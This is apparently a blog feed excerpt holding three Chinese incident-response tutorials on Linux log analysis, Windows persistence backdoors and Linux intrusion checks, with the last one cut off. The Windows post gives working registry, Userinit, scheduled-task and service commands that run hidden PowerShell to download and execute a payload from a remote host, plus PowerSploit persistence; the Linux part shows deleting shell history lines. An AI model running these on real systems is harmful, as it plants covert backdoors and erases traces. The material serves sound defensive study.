    <content type="html"><![CDATA[<h2 id="第2篇-Linux日志分析"><a href="#第2篇-Linux日志分析" class="headerlink" title="第2篇:Linux日志分析"></a>第2篇:Linux日志分析</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 本文简介一下Linux系统日志及日志分析技巧。</p><h3 id="0x01-日志简介"><a href="#0x01-日志简介" class="headerlink" title="0x01 日志简介"></a>0x01 日志简介</h3><p>日志默认存放位置：/var/log/</p><p>查看日志配置情况：more /etc/rsyslog.conf</p><div class="table-container"><table><thead><tr><th style="text-align:center">日志文件</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">/var/log/cron</td><td style="text-align:center">记录了系统定时任务相关的日志</td></tr><tr><td style="text-align:center">/var/log/cups</td><td style="text-align:center">记录打印信息的日志</td></tr><tr><td style="text-align:center">/var/log/dmesg</td><td style="text-align:center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td style="text-align:center">/var/log/mailog</td><td style="text-align:center">记录邮件信息</td></tr><tr><td style="text-align:center">/var/log/message</td><td style="text-align:center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td style="text-align:center">/var/log/btmp</td><td style="text-align:center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td style="text-align:center">/var/log/lastlog</td><td style="text-align:center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td style="text-align:center">/var/log/wtmp</td><td style="text-align:center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td></tr><tr><td style="text-align:center">/var/log/utmp</td><td style="text-align:center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td></tr><tr><td style="text-align:center">/var/log/secure</td><td style="text-align:center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table></div><p>比较重要的几个日志：<br>    登录失败记录：/var/log/btmp     //lastb<br>    最后一次登录：/var/log/lastlog  //lastlog<br>    登录成功记录: /var/log/wtmp     //last<br>    登录日志记录：/var/log/secure   </p><p>​    目前登录用户信息：/var/run/utmp  //w、who、users</p><p>​    历史命令记录：history<br>​    仅清理当前用户： history -c</p><h3 id="0x02-日志分析技巧"><a href="#0x02-日志分析技巧" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h3><h4 id="A、常用的shell命令"><a href="#A、常用的shell命令" class="headerlink" title="A、常用的shell命令"></a>A、常用的shell命令</h4><p>Linux下常用的shell命令如：find、grep 、egrep、awk、sed</p><p>小技巧：</p><p>1、grep显示前后几行信息:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​标准unix/linux下的<span class="keyword">grep</span>通过下面參数控制上下文：</span><br><span class="line">​<span class="keyword">grep</span> -C <span class="number">5</span> foo <span class="keyword">file</span> 显示<span class="keyword">file</span>文件里匹配foo字串那行以及上下<span class="number">5</span>行</span><br><span class="line">​<span class="keyword">grep</span> -B <span class="number">5</span> foo <span class="keyword">file</span> 显示foo及前<span class="number">5</span>行</span><br><span class="line">​<span class="keyword">grep</span> -A <span class="number">5</span> foo <span class="keyword">file</span> 显示foo及后<span class="number">5</span>行</span><br><span class="line">​查看<span class="keyword">grep</span>版本号的方法是</span><br><span class="line">​<span class="keyword">grep</span> -V</span><br></pre></td></tr></table></figure><p>2、grep 查找含有某字符串的所有文件</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;hello,world!&quot; </span><br><span class="line">* : 表示当前目录所有文件，也可以是某个文件名</span><br><span class="line"><span class="deletion">-r 是递归查找</span></span><br><span class="line"><span class="deletion">-n 是显示行号</span></span><br><span class="line"><span class="deletion">-R 查找所有文件包含子目录</span></span><br><span class="line"><span class="deletion">-i 忽略大小写</span></span><br></pre></td></tr></table></figure><p>3、如何显示一个文件的某几行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> input_file | <span class="built_in">tail</span> -n +1000 | <span class="built_in">head</span> -n 2000</span><br><span class="line"><span class="comment">#从第1000行开始，显示2000行。即显示1000~2999行</span></span><br></pre></td></tr></table></figure><p>4、find /etc -name init </p><pre><code>//在目录/etc中查找文件init</code></pre><p>5、只是显示/etc/passwd的账户</p><pre><code>`cat /etc/passwd |awk  -F &#39;:&#39;  &#39;&#123;print $1&#125;&#39;`  //awk -F指定域分隔符为&#39;:&#39;，将记录按指定的域分隔符划分域，填充域，​$0则表示所有域,$1表示第一个域,​$n表示第n个域。</code></pre><p>6、sed -i ‘153,$d’ .bash_history</p><pre><code>删除历史操作记录，只保留前153行</code></pre><h4 id="B、日志分析技巧"><a href="#B、日志分析技巧" class="headerlink" title="B、日志分析技巧"></a>B、日志分析技巧</h4><p><strong>A、/var/log/secure</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep <span class="string">&quot;Failed password for root&quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|grep -E -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line"> grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|perl -e <span class="string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span>|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line">2、登录成功的IP有哪些： </span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span> </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: <span class="attribute">name</span>=kali, <span class="attribute">GID</span>=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: <span class="attribute">name</span>=kali, <span class="attribute">UID</span>=1001, <span class="attribute">GID</span>=1001, <span class="attribute">home</span>=/home/kali</span><br><span class="line">, <span class="attribute">shell</span>=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed <span class="keyword">for</span> kali</span><br><span class="line"><span class="comment">#grep &quot;useradd&quot; /var/log/secure </span></span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete<span class="built_in"> user </span><span class="string">&#x27;kali&#x27;</span></span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed<span class="built_in"> group </span><span class="string">&#x27;kali&#x27;</span> owned by <span class="string">&#x27;kali&#x27;</span></span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow<span class="built_in"> group </span><span class="string">&#x27;kali&#x27;</span> owned by <span class="string">&#x27;kali&#x27;</span></span><br><span class="line"><span class="comment"># grep &quot;userdel&quot; /var/log/secure</span></span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened <span class="keyword">for</span><span class="built_in"> user </span>good by root(<span class="attribute">uid</span>=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : <span class="attribute">TTY</span>=pts/4 ; <span class="attribute">PWD</span>=/home/good ; <span class="attribute">USER</span>=root ; <span class="attribute">COMMAND</span>=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure><p><strong>2、/var/log/yum.log</strong></p><p>软件安装升级卸载日志：</p><figure class="highlight plaintext"><figcaption><span>install gcc</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc</span><br><span class="line"></span><br><span class="line">[root@bogon ~]# more /var/log/yum.log</span><br><span class="line"></span><br><span class="line">Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第03章：权限维持篇第2篇：Windows权限维持--后门篇</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/f8f071fd.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/f8f071fd.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:57:09.050Z</updated>
    
    <content type="html"><![CDATA[<p>关键词：Windows系统后门、权限维持</p><p>在获取服务器权限后，通常会用一些后门技术来维持服务器权限，服务器一旦被植入后门，攻击者便如入无人之境。本文将对常见的window服务端自启动后门技术进行解析，知己知彼方能杜绝后门。</p><p><strong>0x01 注册表自启动</strong></p><p>通过修改注册表自启动键值，添加一个木马程序路径，实现开机自启动。</p><p>常用的注册表启动键：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Run键 </span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line"></span><br><span class="line"># Winlogon\Userinit键</span><br><span class="line">HKEY_CURRENT_USER\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon</span><br><span class="line"></span><br><span class="line">类似的还有很多,关键词：注册表启动键值。</span><br></pre></td></tr></table></figure><p>使用以下命令可以一键实现无文件注册表后门：</p><p><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.28.142:8888/logo.gif&#39;))\&quot;&quot; /f</code></p><p><strong>Logon Scripts 后门</strong></p><p>注册表路径：HKEY_CURRENT_USER\Environment\</p><p>创建字符串键值：  UserInitMprLogonScript，键值设置为bat的绝对路径：<code>c:\test.bat</code></p><p><strong>userinit后门</strong></p><p>在用户进行登陆时，winlogon运行指定的程序。根据官方文档,可以更改它的值来添加与删除程序。</p><p>利用USERINIT注册表键实现无文件后门：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;Userinit&quot;</span>=<span class="string">&quot;C:<span class="subst">\\</span>Windows<span class="subst">\\</span>system32<span class="subst">\\</span>userinit.exe,C:<span class="subst">\\</span>Windows<span class="subst">\\</span>System32<span class="subst">\\</span>WindowsPowerShell<span class="subst">\\</span>v1.0<span class="subst">\\</span>powershell.exe -nop -w hidden -c <span class="subst">\&quot;</span>IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.142:8888/logo.gif&#x27;))<span class="subst">\&quot;</span>&quot;</span></span><br></pre></td></tr></table></figure><p><strong>0x02 组策略设置脚本启动</strong></p><p>运行gpedit.msc进入本地组策略，通过Windows设置的“脚本(启动/关机)”项来说实现。因为其极具隐蔽性，因此常常被攻击者利用来做服务器后门。</p><p><img src="./image/privilege-4-3.png" alt=""></p><p>容易遇到的问题：脚本需全路径，如<code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code></p><p><strong>0x03 计划任务</strong></p><p>通过window系统的任务计划程序功能实现定时启动某个任务，执行某个脚本。</p><p>使用以下命令可以一键实现：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /sc minute /mo <span class="number">1</span> /tn <span class="string">&quot;Security Script&quot;</span> /tr <span class="string">&quot;powershell.exe -nop -w hidden -c <span class="subst">\&quot;</span>IEX ((new-object net.webclient).downloadstring(<span class="subst">\&quot;</span><span class="subst">\&quot;</span><span class="subst">\&quot;</span>http://192.168.28.142:8888/logo.gif<span class="subst">\&quot;</span><span class="subst">\&quot;</span><span class="subst">\&quot;</span>))<span class="subst">\&quot;</span>&quot;</span></span><br></pre></td></tr></table></figure><p>容易遇到的问题：cmd命令行执行单引号会被替换成双引号，故这里使用三个双引号替代。</p><p>计划脚本每 1 分钟运行一次。</p><p><img src="./image/privilege-4-4.png" alt=""></p><p><strong>0x04 服务自启动</strong></p><p>通过服务设置自启动，结合powershell实现无文件后门。</p><p>使用以下命令可实现：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc <span class="keyword">create</span> &quot;KeyName&quot; binpath= &quot;cmd /c start powershell.exe -nop -w hidden -c \&quot;IEX ((<span class="built_in">new</span>-<span class="keyword">object</span> net.webclient).downloadstring(<span class="string">&#x27;http://192.168.28.142:8888/logo.gif&#x27;</span>))\&quot;&quot;</span><br><span class="line"></span><br><span class="line">sc description  KeyName &quot;Just For Test&quot;   //设置服务的描述字符串</span><br><span class="line">sc config <span class="type">Name</span> start= auto                //设置这个服务为自动启动</span><br><span class="line">net <span class="keyword">start</span> <span class="type">Name</span>                            //启动服务</span><br></pre></td></tr></table></figure><p>成功创建了一个自启动服务</p><p><img src="./image/privilege-4-5.png" alt=""></p><p><strong>0x05 WMI后门</strong></p><p>在2015年的blackhat大会上Matt Graeber介绍了一种无文件后门就是用的WMI。这里可以利用一个工具powersploit，下面用它的Persistence模块来示范一个简单的例子。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\Persistence\Persistence.psm1</span><br><span class="line"><span class="variable">$ElevatedOptions</span> = <span class="built_in">New-ElevatedPersistenceOption</span> <span class="literal">-PermanentWMI</span> <span class="literal">-Daily</span> <span class="literal">-At</span> <span class="string">&#x27;3 PM&#x27;</span></span><br><span class="line"><span class="variable">$UserOptions</span> = <span class="built_in">New-UserPersistenceOption</span> <span class="literal">-Registry</span> <span class="literal">-AtLogon</span></span><br><span class="line"><span class="built_in">Add-Persistence</span> <span class="literal">-FilePath</span> .\EvilPayload.ps1 <span class="literal">-ElevatedPersistenceOption</span> <span class="variable">$ElevatedOptions</span> <span class="literal">-UserPersistenceOption</span> <span class="variable">$UserOptions</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure><p><strong>0x06 dll劫持</strong></p><p>如果在进程尝试加载一个DLL时没有指定DLL的绝对路径，那么Windows会尝试去指定的目录下查找这个DLL；如果攻击者能够控制其中的某一 个目录，并且放一个恶意的DLL文件到这个目录下，这个恶意的DLL便会被进程所加载，从而造成代码执行。</p><p>比较常用的如LPK.dll的劫持：</p><p>win7及win7以上系统增加了KnownDLLs保护，需要在注册表：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls</span><br></pre></td></tr></table></figure><p>下添加 “lpk.dll” 才能顺利劫持：</p><p><img src="./image/privilege-4-6.png" alt=""></p><p><strong>0x07 COM劫持</strong></p><p>利用COM劫持技术，最为关键的是dll的实现以及CLSID的选择，通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator劫持，而系统很多正常程序启动时需要调用这两个实例。这种方法可以绕过Autoruns对启动项的检测。</p><p><img src="./image/privilege-4-7.png" alt=""></p><p><strong>0x08 远程控制</strong></p><p>远控木马是一种恶意程序，其中包括在目标计算机上用于管理控制的后门。远程访问木马通常与用户请求的程序（如游戏程序）一起，是一种看不见的下载，或作为电子邮件附件发送。一旦主机系统被攻破，入侵者可以利用它来向其他易受感染的计算机分发远程访问木马，从而建立僵尸网络。</p><p>一般分为客户端和服务端，如：灰鸽子、上兴远控、梦想时代、QuasarRAT等。</p><p><img src="./image/privilege-4-8.png" alt=""></p><p><strong>0x09 结束语</strong></p><p>未知攻焉知防，本文分享了几种Window下的自动启权限维持技术。管理员在平时运维过程应当保持警惕，掌握一定的入侵排查技巧，及时进行系统补丁更新，定期对服务器安全检查，才能有效地预防后门。</p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第01章：入侵排查篇第2篇：Linux 入侵排查</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/6dff2020.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/6dff2020.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:57:09.044Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第2篇：Linux-入侵排查"><a href="#第2篇：Linux-入侵排查" class="headerlink" title="第2篇：Linux 入侵排查"></a>第2篇：Linux 入侵排查</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Linux 服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h3><h4 id="1-1-账号安全"><a href="#1-1-账号安全" class="headerlink" title="1.1 账号安全"></a>1.1 账号安全</h4><p><strong>基本使用：</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、用户信息文件 /etc/passwd</span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">account:</span><span class="symbol">password:</span><span class="variable constant_">UID</span><span class="symbol">:GID</span><span class="symbol">:GECOS</span><span class="symbol">:directory</span><span class="symbol">:shell</span></span><br><span class="line">用户名：密码：用户<span class="variable constant_">ID</span>：组<span class="variable constant_">ID</span>：用户说明：家目录：登陆之后的 shell</span><br><span class="line">注意：无密码只允许本机登陆，远程不允许登陆</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、影子文件 /etc/shadow</span><br><span class="line"><span class="symbol">root:</span>$<span class="number">6</span><span class="variable">$oGs1PqhL2p</span>3ZetrE<span class="variable">$X7o7bzoouHQVSEmSgsYN5UD4</span>.kMHx6qgbTqwNVC5oOAouXvcjQSt.<span class="title class_">Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVv</span>I/<span class="symbol">:</span><span class="number">16809</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:</span><span class="number">99999</span><span class="symbol">:</span><span class="number">7</span><span class="symbol">:</span><span class="symbol">:</span>:</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">who</span>     查看当前登录用户（<span class="built_in">tty</span> 本地登陆  pts 远程登录）</span><br><span class="line">w       查看系统信息，想知道某一时刻用户的行为</span><br><span class="line"><span class="built_in">uptime</span>  查看登陆多久、多少用户，负载状态</span><br></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、查询特权用户特权用户(uid 为<span class="number">0</span>)</span><br><span class="line">[root@localhost ~]<span class="comment"># awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span></span><br><span class="line"><span class="number">2</span>、查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]<span class="comment"># awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span></span><br><span class="line"><span class="number">3</span>、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]<span class="comment"># more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span></span><br><span class="line"><span class="number">4</span>、禁用或删除多余及可疑的帐号</span><br><span class="line">    usermod -L <span class="keyword">user</span>    <span class="title">禁用帐号，帐号无法登录，/etc</span>/shadow 第二栏为 ! 开头</span><br><span class="line">userdel <span class="keyword">user</span>       <span class="title">删除 user</span> 用户</span><br><span class="line">userdel -r <span class="keyword">user</span>    <span class="title">将删除 user</span> 用户，并且将 /home 目录下的 <span class="keyword">user</span> <span class="title">目录一并删除</span></span><br></pre></td></tr></table></figure><h4 id="1-2-历史命令"><a href="#1-2-历史命令" class="headerlink" title="1.2 历史命令"></a>1.2 历史命令</h4><p><strong>基本使用：</strong></p><p>通过 .bash_history 文件查看帐号执行过的系统命令</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、root 用户的历史命令</span><br><span class="line">histroy</span><br><span class="line"><span class="number">2</span>、打开 /home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。</span><br><span class="line">为历史的命令增加登录的 IP 地址、执行命令时间等信息：</span><br><span class="line"><span class="number">1</span>）保存<span class="number">1</span>万条命令</span><br><span class="line">sed -i <span class="string">&#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27;</span> /etc/profile</span><br><span class="line"><span class="number">2</span>）在/etc/profile的文件尾部添加如下行数配置信息：</span><br><span class="line">######jiagu history xianshi#########</span><br><span class="line">USER_IP=`who -u am i <span class="number">2</span>&gt;/dev/null | awk <span class="string">&#x27;&#123;print $NF&#125;&#x27;</span> | sed -e <span class="string">&#x27;s/[()]//g&#x27;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;$USER_IP&quot;</span> = <span class="string">&quot;&quot;</span> ]</span><br><span class="line">then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line"><span class="keyword">export</span> HISTTIMEFORMAT=<span class="string">&quot;%F %T $USER_IP `whoami` &quot;</span></span><br><span class="line">shopt -s histappend</span><br><span class="line"><span class="keyword">export</span> PROMPT_COMMAND=<span class="string">&quot;history -a&quot;</span></span><br><span class="line">######### jiagu history xianshi ##########</span><br><span class="line"><span class="number">3</span>）source /etc/profile 让配置生效</span><br><span class="line">生成效果： <span class="number">1</span>  <span class="number">2018</span><span class="number">-07</span><span class="number">-10</span> <span class="number">19</span>:<span class="number">45</span>:<span class="number">39</span> <span class="number">192.168</span><span class="number">.204</span><span class="number">.1</span> root source /etc/profile</span><br><span class="line"><span class="number">3</span>、历史操作命令的清除：history -c</span><br><span class="line">但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。</span><br></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入用户目录下，导出历史命令。</span><br><span class="line">cat <span class="string">.bash_history</span> &gt;&gt; <span class="keyword">history</span>.txt</span><br></pre></td></tr></table></figure><h4 id="1-3-检查异常端口"><a href="#1-3-检查异常端口" class="headerlink" title="1.3 检查异常端口"></a>1.3 检查异常端口</h4><p>使用 netstat 网络连接命令，分析可疑端口、IP、PID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | more</span><br><span class="line"></span><br><span class="line">查看下 pid 所对应的进程文件路径，</span><br><span class="line">运行 <span class="built_in">ls</span> -l /proc/<span class="variable">$PID</span>/exe 或 file /proc/<span class="variable">$PID</span>/exe（<span class="variable">$PID</span> 为对应的 pid 号）</span><br></pre></td></tr></table></figure><h4 id="1-4-检查异常进程"><a href="#1-4-检查异常进程" class="headerlink" title="1.4 检查异常进程"></a>1.4 检查异常进程</h4><p>使用 ps 命令，分析进程</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ps</span> aux | <span class="keyword">grep</span> pid </span><br></pre></td></tr></table></figure><h4 id="1-5-检查开机启动项"><a href="#1-5-检查开机启动项" class="headerlink" title="1.5 检查开机启动项"></a>1.5 